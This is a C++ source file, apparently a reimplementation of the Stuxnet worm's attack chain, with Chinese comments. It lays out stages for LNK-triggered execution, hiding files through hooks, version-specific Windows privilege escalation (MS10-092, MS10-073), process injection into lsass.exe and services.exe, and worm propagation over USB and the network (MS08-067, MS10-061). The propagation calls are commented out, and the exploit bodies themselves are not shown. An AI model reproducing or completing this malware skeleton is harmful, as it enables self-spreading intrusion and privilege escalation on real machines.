// stuxnet_exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include"include.h"


bool exp_main()
{
    //  阶段一：MS10-046 lnk触发执行
    //  阶段二：隐身
    //  阶段三：提权
    //  阶段四：注入进程lsass.exe等
    //  阶段五：1.注册服务：mrxnet.sys(内核层隐藏文件)
    //          2.注册服务：mrxcls.sys(负责注入进程)
    //  阶段六：注入services.exe，S7tgtopx.exe
    //  阶段七：U盘和内网传播（MS10-046,MS08-067,MS10-061）

    /*阶段一：lnk触发执行****************************************************************/
    OutputDebugString(L"lnk execute!");
    /*阶段二：隐身***********************************************************************/
    ring3_main_hook();
    OutputDebugString(L"file hide success!");
    return true;
    /*阶段三：提权***********************************************************************/
    TargetInfo info;
    check_target_info(info);
    wchar_t buffer[200] = { 0 };
    wsprintf(buffer,L"current dwMajorVersion:%d dwMinorVersion: %d bIsWow64:%d", info.dwMajorVersion, info.dwMinorVersion, info.bIsWow64);
    OutputDebugString(buffer);
    if (check_admin() == FALSE)
    {
        //提权操作
        if (info.dwMajorVersion == 6 && info.dwMinorVersion<=1)
        {
            //[ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
            exp_ms10_092();
        }
        else if(info.dwMajorVersion == 5 && info.dwMinorVersion <= 2)
        {
            //[ 'Windows 2000', 'Windows XP' ]
            bool isXP = false;
            if (info.dwMinorVersion == 0)
                isXP = false;
            else
                isXP = true;
            DWORD dwThread = 0;
            HANDLE thread = CreateThread(NULL, 0, exp_ms10_073, &isXP, 0, &dwThread);
            if(thread)
                WaitForSingleObject(thread, INFINITE);
        }
    }
    OutputDebugString(L"Current privilige is system!");

    //本地存储传播-U盘传播

    //内网传播--打印机共享传播
    //if (true)
    //{
    //    DWORD dwThread = 0;
    //    HANDLE thread = CreateThread(NULL, 0, exp_ms10_061, 0, 0, &dwThread);
    //}
    
    //内网传播--rpc传播
    //if (true)
    //{
    //    DWORD dwThread = 0;
    //    HANDLE thread = CreateThread(NULL, 0, exp_ms08_067, 0, 0, &dwThread);
    //}
    
    system("pause");
    return true;
}
